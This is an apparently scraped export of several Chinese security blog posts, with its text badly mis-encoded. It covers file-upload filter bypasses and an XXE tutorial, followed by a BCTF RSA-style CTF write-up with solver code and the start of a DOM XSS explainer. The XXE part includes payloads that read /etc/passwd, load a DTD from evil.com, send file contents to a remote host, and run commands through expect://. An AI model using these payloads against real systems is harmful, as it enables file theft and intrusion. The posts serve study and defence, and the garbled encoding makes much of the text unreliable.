ä¸­æåˆ°äº†ä¸‹é¢ä¸€æ®µè¯ move_uploaded_file section, there is a warning which states â€˜If the destination file already exists, it will be overwritten.â€™ å¦‚æœ PHP å®‰å…¨æ²¡é…ç½®å¥½ å°±å¯ä»¥é€šè¿‡ move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æ‰æœåŠ¡å™¨ä¸Šçš„ è¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æåå•äº† è§£ææ¼æ´ï¼ˆapacheè§£ææ¼æ´ï¼Œiis6.0è§£ææ¼æ´ï¼Œnginxè§£ææ¼æ´ï¼‰ apacheè§£ææ¼æ´apacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœæœ€å³çš„åç¼€æ— æ³•è§£æï¼Œåˆ™å°è¯•è§£æåä¸€ä¸ªåç¼€ iis6.0è§£ææ¼æ´ æˆå› ä¸ºiis6.0ä¸è§£æ;åé¢çš„ï¼Œæ‰€ä»¥æäº¤evil.asp;.htmlè§£æä¸ºaspç±»å‹ è¿˜æœ‰ä¸€ä¸ªä¸ºIIS6.0çš„00æˆªæ–­æ”»å‡» IIS6.0åŒæ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤¹çš„åå­—åŒ…å«.aspåˆ™è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶éƒ½ä»¥aspçš„å½¢å¼æ¥è§£æ iis7.0/7.5è§£ææ¼æ´å¯¹äºphpæœ‰ä¸€ä¸ªç±»ä¼¼Nginxçš„è§£ææ¼æ´evil.jpg/evil.php è§£æevil.jpgä¸­çš„phpä»£ç ï¼Œè¿™ä¸ªæ¼æ´æˆå› åœ¨äºphp-cgiçš„æ¼æ´ nginxè§£ææ¼æ´ å°†phpæ–‡ä»¶æ¢æˆå…¶ä»–å¯ä»¥é€šè¿‡çš„æ–‡ä»¶åç¼€ï¼Œè®¿é—®çš„æ—¶å€™åœ¨åé¢åŠ ä¸Š/.phpï¼Œå³evil.jpg/.phpï¼Œevil.jpgä¼šè§£æä¸ºphpçš„æ ¼å¼ %00æˆªæ–­ å…¶ä»–æ–¹å¼æäº¤å‰å°†filename=â€evil.phpâ€è¯¥ä¸ºâ€evil.phpâ€.jpgâ€ ç™½åå•æ£€æµ‹ 0x00æˆªæ–­ç»•è¿‡ è§£ææ¼æ´ç»•è¿‡ï¼ˆæ–‡ä»¶åä¸è¢«é‡å†™ï¼‰ æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰å›¾åƒç±»çš„æ–‡ä»¶å†…å®¹æ£€æµ‹ æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆå›¾ç‰‡å¤´æ ¼å¼æ£€æµ‹ï¼‰jpgå†…å®¹å¤´value= FF D8 FF E0 00 10 4A 46 49 46gifå†…å®¹å¤´value= 47 49 46 38 39 61pngå†…å®¹å¤´value= 89 50 4E 47 åœ¨æ–‡ä»¶å¤´ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±èƒ½ç»•è¿‡ æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯phpçš„getimagesize()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„æ³¨é‡ŠåŒºï¼ˆdataåŒºï¼‰æ’å…¥ä¸€å¥è¯ä»£ç ï¼Œå¦‚ä¸‹ï¼š1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) æ–‡ä»¶åŠ è½½æ£€æµ‹ è°ƒç”¨APIæˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼ŒäºŒæ¬¡æ¸²æŸ“ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå†ä¸‹è½½ä¸‹æ¥ï¼Œdiffä¸€ä¸‹æ‰¾åˆ°ä¸å˜çš„ä½ç½®æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æˆåŠŸç‡ä¸é«˜ æ€»ç»“è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡» ç»•è¿‡ javascript å¯¹æ‰©å±•åçš„æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ç›´æ¥ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹&gt; ç»•è¿‡æœåŠ¡ç«¯å¯¹ http request åŒ… MIME ç±»å‹æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ä¼ªé€  POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡ MIME æ£€æµ‹&gt; è·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡» é»‘åå•ç»•è¿‡ æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ åå•åˆ—è¡¨ç»•è¿‡ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ .htaccess æ–‡ä»¶æ”»å‡» æœ¬åœ°åŒ…å«æ¼æ´ Apache è§£ææ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ ç™½åå•ç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡» æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡&lt;å¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æè°ƒç”¨/æ¼æ´&gt;"},{"title":"ã€VULNERABLITYã€‘XML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-xxe/","text":"æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.comXMLä¾‹å­1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xmlå£°æ˜&lt;!DOCTYPE note[ æ–‡æ¡£ç±»å‹å®šä¹‰ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; æ–‡æ¡£å…ƒç´ &lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; ä¸Šè¿°ä¸ºä¸€ä¸ªXMLçš„å®ä¾‹DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜DTD&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; å¼•ç”¨å¤–éƒ¨DTD&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;æˆ–è€…&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜å®ä½“&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; å¼•ç”¨å¤–éƒ¨å®ä½“&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;æˆ–è€…&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; æ¼æ´æè¿°æ‘˜è‡ªOWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. æ¼æ´æˆå› ä¸ºXMLè§£æå™¨é…ç½®ä¸å®‰å…¨æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚ è¯•éªŒæ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“æ–¹å¼ï¼š æœ¬åœ°æ–‡ä»¶è¯»å– 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; è¿œç¨‹æ–‡ä»¶è¯»å– 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;å…¶ä¸­evil.dtdæ–‡ä»¶å†…å®¹&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; ä½†æ˜¯å¦‚æœé‡åˆ°è¯»å–å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šè¯»ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹ftpæ¥å—xxeæ•°æ®ä¸åŒçš„è¯­è¨€é»˜è®¤æ”¯æŒçš„åè®®ä¸åŒ libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp ä¸Šè¿°ä¸ºé»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥é€šè¿‡æ‰©å±•æ”¯æŒå…¶ä»–åè®®ï¼Œå¦‚php scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);è¿œç¨‹DTDæ–‡ä»¶å†…å®¹&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; æ‰§è¡ŒæˆåŠŸéœ€è¦phpçš„expectæ‰©å±• demo4 æ¢æµ‹å†…ç½‘åº”ç”¨123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; å¦‚æœä¸å­˜åœ¨è¯¥ipçš„åº”ç”¨ï¼Œä¼šæœ‰warning failed to open streamï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¢æµ‹å†…å®¹åº”ç”¨åŒæ—¶å¦‚æœæ‰¾åˆ°äº†å†…å®¹åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ”»å‡»å†…ç½‘åº”ç”¨ é˜²å¾¡æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• PHPï¼šlibxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Pythonï¼šfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚ jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»å¦‚ä»Šå¾ˆå¤šwebåº”ç”¨ç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ä¼ é€’ï¼Œé€šè¿‡åœ¨http requestå¤´ä¸­å¸¦å…¥Content-Type: application/jsonè¡¨æ˜ä¼ é€’çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®ã€‚ä½†æ˜¯æœ‰æ—¶å€™æœåŠ¡å™¨å¯ä»¥æ¥å—å¼€å‘äººå‘˜æ²¡æœ‰æ„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œå¦‚xmlæ ¼å¼ã€‚å¦‚æœæœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨xxeã€‚1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å°†å¦‚ä¸Šçš„Content-Typeæ”¹ä¸ºxmlæ ¼å¼çš„å†å‘é€123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å¦‚æœè¿”å›çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜æœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨xxeæ¥æ”»å‡»1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„jsonèŠ‚ç‚¹éƒ½æ˜¯æ¥å—xmlæ ¼å¼çš„æ•°æ®çš„ã€‚æœ‰å¯èƒ½è¿”å›è§£æé”™è¯¯çš„æç¤ºæˆ–è€…415ä¸æ”¯æŒåª’ä½“ç±»å‹çš„é”™è¯¯æ¶ˆæ¯ å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attackså‚è€ƒsecurity.tencent.comï¼Œ91ri.org"},{"title":"ã€CTFã€‘BCTF Crypto SpecialRSA writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"é¢˜ç›®æè¿°å°†é™„å¸¦çš„zipæ–‡ä»¶ä¸‹è½½å¹¶è§£å‹ã€‚å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š åŠ å¯†ç®—æ³• ç¤ºä¾‹å¯†æ–‡ ç¤ºä¾‹æ˜æ–‡ åŠ å¯†çš„flagæ–‡ä»¶å¤§è‡´æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œé¢˜ç›®çš„æ„å›¾ä¸ºé€šè¿‡ç¤ºä¾‹å¯†æ˜æ–‡ï¼Œç®—å‡ºåŠ å¯†ç§˜é’¥kï¼Œç„¶åé€šè¿‡kè§£å¯†flagæ–‡ä»¶ã€‚é˜…è¯»åŠ è§£å¯†ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹çš„æ•°å­¦å…¬å¼ï¼š12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N å·²çŸ¥2ç»„(m,r,c) N çš„å€¼ æ±‚è§£k åˆ°è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡ä¸ªæ­£ç¡®çš„æ–¹å¼æ¥è·å–kï¼Œä¸ç”¨æ•°å­¦å°±ä¼šå¿˜è®°å•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚åæ¥æ±‚ç»„äº†è€å¸ˆï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ã€‚12345678910ä¸‹é¢æ‰€æœ‰^-1è¡¨ç¤ºå¯¹åº”çš„ä¹˜æ³•é€†å…ƒ å‡è®¾gcd(r1,r2)=1,é‚£ä¹ˆå­˜åœ¨a,bä½¿å¾—å…¬å¼r1*a+r2*b=1 é‚£ä¹ˆ k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^bè€Œk^rn å¯ä»¥é€šè¿‡(m,r,c)å¯¹æ¥è·å¾—è¿™é‡Œç›´æ¥ä½¿ç”¨encodeå…¬å¼c=[(k^r%N)*m]%Né€šè¿‡æ¨å¯¼å¯ä»¥å¾—å‡ºk^r=c*(m^-1)mçš„é€†å…ƒå¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•æ¥æ±‚å¾— æœ‰äº†ä¸Šé¢çš„æ€è·¯ï¼Œå°±å¯ä»¥å†™ç¨‹åºæ¥åŠ è§£å¯†äº†ï¼Œè¿™é‡Œæˆ‘ç”¨äº†pythonæ¥å†™ï¼Œå…¶ä¸­(m,r,c)å¯¹æˆ‘äº‹å…ˆæ‹¿å‡ºæ¥äº†ï¼Œæ¸…æ¥šä¸€ç‚¹,ä¸‹é¢çš„ç¨‹åºæ˜¯æ¥ç®—kçš„123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³• a*x + b*y = gcd(a,b) è¿”å› x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd :param a: :param b: :return:x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# æ±‚é€†å…ƒkr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k é€šè¿‡ä¸Šé¢çš„ç¨‹åºå¯ä»¥ç®—å‡º k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L æ¥ä¸‹æ¥å°±ç®€å•äº†å°†kå¸¦å…¥å®˜æ–¹çš„ç®—æ³•å°±å¯ä»¥å¾—åˆ°flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}ä¸Šé¢ç¨‹åºä¸­éœ€è¦æ³¨æ„çš„æ˜¯powå‡½æ•°ä¸æ”¯æŒæŒ‡æ•°ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥è¿˜è¦å†è½¬ä¸€ä¸‹å¼¯ã€‚ 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-bæ‰€ä»¥å¯ä»¥å…ˆæ±‚å‡ºk^r mod Nçš„é€†å…ƒ æ€»ç»“æ•°å­¦æ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯çŸ­æ¿å•Šï¼Œä»¥åå¾—åŠ å¼ºä¸€ä¸‹:)"},{"title":"ã€VULNERABLITYã€‘DOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-DOM-XSS/","text":"å¼•è¨€ è¿™å‡ å¤©é˜…è¯»äº†ã€ŠWebå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹ ï¼Œå¯¹DOMå‹çš„XSSè¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹ä¸»è¦ä¸ºä¹¦ä¸­æåˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ•´ç†æ•´ç†ä½œä»¥åå¤ä¹ æ‰€ç”¨ã€‚ DOMç±»å‹çš„XSSä¸åå°„å‹ã€å­˜å‚¨å‹XSSéƒ½ä¸åŒï¼ŒDOMå‹XSSä¸ç”¨æœåŠ¡å™¨ç«¯è§£æå“åº”çš„å‚ä¸ï¼Œè§¦å‘DOMå‹XSSå¯ä»¥è¯´ä¸»è¦ä¾é æµè§ˆå™¨å®¢æˆ·ç«¯çš„è§£æã€‚å¸¸è§çš„è¾“å‡ºç‚¹è§0x04é™„å½•ã€‚ DOMæ¸²æŸ“ é¦–å…ˆæˆ‘ä»¬æ¥ç†è§£ä¸€ä¸‹HTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼ŒæŸ¥çœ‹ä»¥ä¸‹ä¸‰ä¸ªä¾‹å­123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; å¯¹äºç¬¬ä¸€ç§æƒ…å†µï¼Œå¾ˆæ¸…æ¥šï¼Œç‚¹å‡»è¿™ä¸ªæŒ‰é’®åï¼Œä¼šå°†&lt;img src=@ onerror=alert(123) /&gt;å†™å…¥DOMä¸­ï¼Œå¹¶è§¦å‘alert(123)ã€‚è€Œç¬¬äºŒç§ä¸ç¬¬ä¸‰ç§ï¼Œdocument.writeçš„å†…å®¹éƒ½å˜æˆäº†&amp;lt;img src=@ onerror=alert(123) /&amp;gt;ï¼ŒåŒºåˆ«åœ¨äºä¸€ä¸ªæ˜¯åœ¨HTMLæ ‡ç­¾ä¸­,ä¸€ä¸ªæ˜¯é€šè¿‡Javascriptå¤„ç†åæ‰å˜æˆè¿™ä¸ªæ ·å­çš„ï¼Œé‚£ä¹ˆè¿™2ç§æƒ…å†µéƒ½ä¼šè§¦å‘å¼¹çª—å—ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§ä¸ä¼šï¼Œè€Œç¬¬ä¸‰ç§ä¼šè§¦å‘ã€‚ å½¢æˆè¿™æ ·çš„åŸå› å°±æ˜¯å› ä¸ºHTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼Œåœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptå¯ä»¥è¿›è¡ŒHTMLå½¢å¼çš„ç¼–ç ã€‚åœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptä»£ç ä¼šå…ˆè¢«HTMLå½¢å¼çš„ç¼–ç è¿›è¡Œè§£ç ï¼Œå³ç¬¬ä¸‰ç§æƒ…å†µä¸­&amp;lt;img src=@ onerror=alert(123) /&amp;gt;åœ¨javascriptè¿è¡Œå‰å·²ç»è§£ç ä¸º&lt;img src=@ onerror=alert(123) /&gt;ï¼Œè€Œç¬¬äºŒç§æƒ…å†µä¸ºjavascriptè¿è¡Œä¸­è¿›è¡Œçš„HTMLå½¢å¼çš„ç¼–ç 